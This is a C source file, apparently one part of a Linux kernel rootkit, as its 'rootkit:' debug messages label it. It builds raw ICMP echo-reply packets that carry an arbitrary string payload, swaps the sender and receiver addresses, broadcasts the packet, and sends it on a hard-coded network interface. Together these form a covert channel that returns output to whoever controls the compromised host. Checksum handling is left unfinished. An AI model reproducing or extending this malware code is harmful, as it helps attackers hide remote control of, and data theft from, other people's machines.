#include "icmp.h"


int return_icmp(char* string, struct icmphdr* icmph, struct iphdr* iph, struct net_device* dev){

    
    int payload_size = strlen(string);

    u32 saddr_copy;
    unsigned char* payload;

    // we don't noe the mac address, so we will transmit our packet to all devices
    static char return_mac[ETH_ALEN] = {0xff,0xff,0xff,0xff,0xff,0xff}; 
    int ret;
    struct sk_buff* skb;
    struct icmphdr* new_icmph;
    struct iphdr* new_iph;
    struct ethhdr* new_eth;


    DEBUG_PUTS("rootkit: 1\n")
    // allocation memort for 3 headers + payload
    skb = alloc_skb(ETH_HLEN + ICMP_HSIZE + IP_HSIZE + payload_size, GFP_ATOMIC);

    DEBUG_PUTS("rootkit: 2\n")

    // reserving size for headers
    skb_reserve(skb, ETH_HLEN + ICMP_HSIZE + IP_HSIZE);

    // putting the payload in socket buffer
    payload = skb_put(skb, payload_size);
    memcpy(payload, string, payload_size);

    // icmp header needs only to change the type
    new_icmph = (struct icmphdr*)skb_push(skb, ICMP_HSIZE);  
    memcpy(new_icmph, icmph, ICMP_HSIZE);
    new_icmph->type = ICMP_ECHOREPLY;

    // TODO: add sum recalculation

 
    new_iph = (struct iphdr*)skb_push(skb, IP_HSIZE);
    memcpy(new_iph, iph, IP_HSIZE);
    new_iph->tot_len = htons(ICMP_HSIZE + IP_HSIZE + payload_size);

    // swapping sender and reciever
    saddr_copy = new_iph->saddr;
    new_iph->saddr = new_iph->daddr;
    new_iph->daddr = saddr_copy;
    DEBUG_PUTS("rootkit: 3\n")

    // configuring the socket
    skb->dev = dev;
    skb->pkt_type = PACKET_OUTGOING;
    skb->protocol = htons(ETH_P_IP);
    skb->no_fcs = 1;
    


    new_eth = (struct ethhdr*)skb_push(skb, sizeof (struct ethhdr));

    new_eth->h_proto = skb->protocol;
    memcpy(new_eth->h_source, dev->dev_addr, ETH_ALEN);
    memcpy(new_eth->h_dest, return_mac, ETH_ALEN);
    

    // adding the packet to transmit queue
    ret = dev_queue_xmit(skb);

    DEBUG_PRINTF("rootkit: ret: %d\n", ret)
    

    return ret;
}


void send_response(char* string, args_t* args) {

    struct net_device *enp0s3;
    enp0s3 = dev_get_by_name(&init_net,"enp0s3");
    return_icmp(string, args->icmph, args->iph, enp0s3);

    // freeing the device
    dev_put(enp0s3);

    // freeing recieved packet content
    kfree_skb(args->skb);
}